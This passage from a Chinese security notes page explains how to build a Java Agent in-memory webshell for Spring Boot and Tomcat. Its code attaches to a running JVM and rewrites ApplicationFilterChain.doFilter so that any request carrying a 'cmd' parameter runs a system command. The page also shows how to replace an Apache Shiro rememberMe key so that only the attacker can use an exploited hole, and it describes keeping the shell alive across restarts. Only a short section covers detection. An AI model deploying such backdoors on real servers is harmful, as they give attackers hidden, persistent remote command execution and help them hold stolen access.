<li>attach代码还是差不多，主要是给<code>agent.jar</code>附加进去</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AgentInitializationException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AgentLoadException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AttachNotSupportedException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.VirtualMachine;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Attach {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 列出所有的jvm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(VirtualMachine.list());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String pid = &quot;69484&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String jarName = &quot;/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 连接到JVM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        VirtualMachine virtualMachine = VirtualMachine.attach(pid);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 加载agentmain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtualMachine.loadAgent(jarName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 断开连接</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtualMachine.detach();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;ends&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li>AgentMain（主要是添加Transformer和触发Transformer）</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// AgentMain.java</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.Instrumentation;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.UnmodifiableClassException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class AgentMain {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for (Class cls : allLoadedClasses){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 定位到类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (cls.getName() == TransformerDemo.editClassName){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 添加Transformer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                inst.addTransformer(new TransformerDemo(), true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 触发Transformer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                inst.retransformClasses(cls);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// TransformerDemo.java</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javassist.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.ClassFileTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.IllegalClassFormatException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.security.ProtectionDomain;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// addTransformer()的第一个参数需要ClassFileTransformer这个类的对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class TransformerDemo implements ClassFileTransformer {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String editClassName = &quot;Hello&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String editMethod = &quot;hello&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ClassPool classPool = ClassPool.getDefault();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 添加额外的类搜索路径</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (classBeingRedefined != null){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            classPool.insertClassPath(classClassPath);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 修改方法hello()，返回 byte[] 字节码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            CtClass ctClass = classPool.get(editClassName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String modifySource = &quot;System.out.println(\&quot;TransformerDemo attached\&quot;);&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ctMethod.setBody(modifySource);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            byte[] bytes = ctClass.toBytecode();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ctClass.detach();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return bytes;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (NotFoundException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (CannotCompileException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (IOException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return new byte[0];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li>结果，可以看到第二次执行<code>hello()</code>方法时发现该方法被动态的修改了</li>
</ul>
<p>![image-20211126175454346](Java Agent 内存马.assets/image-20211126175454346.png)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="内存马">内存马<a href="#内存马" class="hash-link" aria-label="内存马的直接链接" title="内存马的直接链接">​</a></h2>
<p>既然现在已经能够修改方法体了，那就可以将木马放到<strong>某个一定会执行</strong>的方法内，这样的话，当访问任意路由的时候，就会调用木马。那么现在的问题就变成了，注入到哪一个类的哪个方法比较好。</p>
<p>众所周知，Spring boot 中内嵌了一个<code>embed Tomcat</code>作为容器，而在网上流传着很多版本的 Tomcat“无文件”内存马。这些内存马大多数都是通过**重写/添加<code>Filter</code>**来实现的。既然Spring boot 使用了<code>Tomcat</code>，那么能不能照葫芦画瓢，通过<code>Filter</code>，实现一个Spring boot的内存马呢？当然是可以的。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="spring-boot的filter">Spring Boot的Filter<a href="#spring-boot的filter" class="hash-link" aria-label="Spring Boot的Filter的直接链接" title="Spring Boot的Filter的直接链接">​</a></h3>
<p>给写的<code>Controller</code>下个断点，可以看到执行到<code>controller</code>的时候，会经过很多的<code>doFilter</code>和<code>internalDoFilter</code>方法，它们大多来自于<code>ApplicationFilterChain</code>这个类。</p>
<p>![image-20211126181552570](Java Agent 内存马.assets/image-20211126181552570.png)</p>
<p>看看<code>ApplicationFilterChain</code>的<code>doFilter</code>方法：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public void doFilter(ServletRequest request, ServletResponse response)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    throws IOException, ServletException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if( Globals.IS_SECURITY_ENABLED ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        final ServletRequest req = request;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        final ServletResponse res = response;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            java.security.AccessController.doPrivileged(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new java.security.PrivilegedExceptionAction&lt;Void&gt;() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    public Void run()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        throws ServletException, IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        internalDoFilter(req,res);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        return null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            );</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (PrivilegedActionException pe) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ......</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        internalDoFilter(request,response);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>乍一看内容挺多，其实总结下来就是调用<code>this.internalDoFilter()</code>。所以再来简单看一下<code>internalDoFilter()</code>方法：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">private void internalDoFilter(ServletRequest request,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                  ServletResponse response)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        throws IOException, ServletException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // Call the next filter if there is one</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (pos &lt; n) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ......</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>这两个个方法拥有<code>Request</code>和<code>Response</code>参数。如果能重写其中一个，那就能控制所有的请求和响应！因此，用来作为内存马的入口点简直完美。这里我选择<code>doFilter()</code>方法，具体原因会在之后提到。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="java-agent修改dofilter">Java agent修改doFilter<a href="#java-agent修改dofilter" class="hash-link" aria-label="Java agent修改doFilter的直接链接" title="Java agent修改doFilter的直接链接">​</a></h3>
<blockquote>
<p>注意:</p>
<ol>
<li>每次attach之前，需要访问一下spring的web页面，要让Spring <code>Initializing Spring DispatcherServlet &#x27;dispatcherServlet&#x27;</code>，加载一下需要的类，不然不会attach成功，因为找不到我们要修改的类，所以也找不到方法，也就无法修改成功</li>
<li>shell中所有类都要用全称，比如<code>java.io.InputStream</code>，不然可能会抛出异常</li>
<li>如果是完全替代方法，记得用<!-- -->包裹</li>
<li>可能会出现各种<code>java.lang.NoClassDefFoundError</code>的问题，跟一下这个断点，就会发现缺少各种各样的class文件，跟了一下，发现可能是动态修改字节码后，整个类的class都会出现异常，太离谱了，也不知道网上的大哥们为啥没遇到</li>
<li>接上一个问题，动态修改过的class文件反编译后代码是没问题的，但是还是不知道为啥解决不了找不到类定义的问题</li>
</ol>
</blockquote>
<p>对刚才的agent代码稍微修改即可（实在重写不了<code>doFilter</code>方法了，分析了几天，重写了class就算代码没问题，也会出现<code>java.lang.NoClassDefFoundError</code>的问题）</p>
<blockquote>
<p>并且这里为了不破坏原来的方法结构，我们不用<code>CtMethod</code>的<code>setSource</code>，而是用<code>insertBefore</code>方法</p>
</blockquote>
<ul>
<li>AgentMain.java</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// AgentMain.java</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.Instrumentation;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.UnmodifiableClassException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class AgentMain {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for (Class cls : allLoadedClasses){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 定位到类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (cls.getName() == TransformerDemo.editClassName){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 添加Transformer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                inst.addTransformer(new TransformerDemo(), true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 触发Transformer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                inst.retransformClasses(cls);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// TransformerDemo.java</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javassist.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.ClassFileTransformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.IllegalClassFormatException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.security.ProtectionDomain;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// addTransformer()的第一个参数需要ClassFileTransformer这个类的对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class TransformerDemo implements ClassFileTransformer {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String editClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String editMethod = &quot;doFilter&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String memshell = &quot;&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;    javax.servlet.http.HttpServletRequest req =  $1;\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;    javax.servlet.http.HttpServletResponse res = $2;\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;    java.lang.String cmd = req.getParameter(\&quot;cmd\&quot;);\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;    if (cmd != null){\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;       System.out.println(cmd);&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;        try {\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;            java.lang.Runtime.getRuntime().exec(cmd);\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;        } catch (Exception e){\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;            e.printStackTrace();\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;        }\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;    }\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;    else{\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;        internalDoFilter(req,res);\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;    }\n&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &quot;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ClassPool classPool = ClassPool.getDefault();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 添加额外的类搜索路径</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (classBeingRedefined != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            classPool.insertClassPath(classClassPath);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 修改方法doFilter()，返回 byte[] 字节码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            CtClass ctClass = classPool.get(editClassName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ctMethod.insertBefore(memshell);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ctClass.writeFile(&quot;/Users/d4m1ts/d4m1ts/java/Temp/out/artifacts/temp_jar&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(memshell);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;injection success&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            byte[] bytes = ctClass.toBytecode();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ctClass.detach();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return bytes;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (NotFoundException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (CannotCompileException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (IOException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return new byte[0];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>给上面的打包成<code>agent.jar</code>，然后通过虚拟机attach到spring jvm中，再执行命令即可（理论上是可以的，网上的文章也都可以成功，但我实在是调不出来为啥了）</p>
<p>![image-20211208100426485](Java Agent 内存马.assets/image-20211208100426485.png)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="拓展操作">拓展操作<a href="#拓展操作" class="hash-link" aria-label="拓展操作的直接链接" title="拓展操作的直接链接">​</a></h2>
<p>通过加载agent可以修改很多类的字节码，所以利用起来操作的空间也很大，不仅仅是内存马这一个点。</p>
<p>一个比较多的利用方法，就是修改<code>shiro</code>的key，这样可以让这个漏洞仅自己可用，避免共享目标权限</p>
<p><strong>重点：</strong></p>
<p><strong>在解析rememberMe的时候，先将其base64解码，然后使用AES解密，在AES解密的时候，会调用<code>org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()</code></strong>，更改掉这个函数的返回值，就可以更改解密的密钥。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 使用insertBefore()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$0.setCipherKey(org.apache.shiro.codec.Base64.decode(&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 使用setBody()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return (org.apache.shiro.codec.Base64.decode(&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;));</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="查杀">查杀<a href="#查杀" class="hash-link" aria-label="查杀的直接链接" title="查杀的直接链接">​</a></h2>
<p>agent 内存马相比 filter 内存马，会多一步就是我们需要将我们自己的 <code>agent.jar</code> 传到目标上，然后利用代码将 <code>agent.jar</code> 进行注入，注入之后我们就可以将 <code>agent.jar</code> 进行删除，agent 内存马相比 filter 这些内存马相对更难查杀一些</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/Whta6akjaZamc3nOY1Tvxg" target="_blank" rel="noopener noreferrer">基于javaAgent内存马检测查杀指南</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="风险">风险<a href="#风险" class="hash-link" aria-label="风险的直接链接" title="风险的直接链接">​</a></h2>
<p>注入agent内存马后，可能存在我上面那种整个网站崩溃的情况；网上有说可能是因为虚拟内存不够了而导致的，但是我设置大了虚拟内存还是不行。。。</p>
<blockquote>
<p>所以实战中尽量还是用API型的内存马</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="内存马复活">内存马复活<a href="#内存马复活" class="hash-link" aria-label="内存马复活的直接链接" title="内存马复活的直接链接">​</a></h2>
<p>换个说法，如何防止内存马重启后失效；</p>
<p>其实也很简单，就是在jvm关闭前，把<code>attach.jar</code>和<code>agentMain.jar</code>都写到磁盘上，然后无限调用<code>attach.jar</code>尝试attach到jvm中；</p>
<p>但是这样感觉更容易被发现了，所谓有得必有失吧emmm</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="总览">总览<a href="#总览" class="hash-link" aria-label="总览的直接链接" title="总览的直接链接">​</a></h2>
<p>![Java Agent Overview](Java Agent 内存马.assets/java_agent_overview_min.png)</p>
<ul>
<li><a href="https://xz.aliyun.com/t/9450#toc-13" target="_blank" rel="noopener noreferrer">Java Agent 从入门到内存马</a></li>
<li><a href="http://wjlshare.com/archives/1582" target="_blank" rel="noopener noreferrer">浅谈 Java Agent 内存马</a></li>
<li><a href="https://y4er.com/post/javaagent-tomcat-memshell/" target="_blank" rel="noopener noreferrer">Java Agent实现反序列化注入内存shell</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T04:13:25.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/代码审计/Java安全/内存马/Spring内存马"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Spring内存马</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/category/杂项"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">杂项</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#介绍" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#premain" class="table-of-contents__link toc-highlight">premain</a></li><li><a href="#agentmain" class="table-of-contents__link toc-highlight">agentmain</a><ul><li><a href="#virtualmachine" class="table-of-contents__link toc-highlight">VirtualMachine</a></li><li><a href="#实现举例" class="table-of-contents__link toc-highlight">实现举例</a></li></ul></li><li><a href="#instrumentation" class="table-of-contents__link toc-highlight">Instrumentation</a><ul><li><a href="#获取所有可修改类" class="table-of-contents__link toc-highlight">获取所有可修改类</a></li><li><a href="#修改类" class="table-of-contents__link toc-highlight">修改类</a><ul><li><a href="#classfiletransformer" class="table-of-contents__link toc-highlight">ClassFileTransformer</a></li><li><a href="#javassist" class="table-of-contents__link toc-highlight">javassist</a><ul><li><a href="#依赖" class="table-of-contents__link toc-highlight">依赖</a></li><li><a href="#classpool" 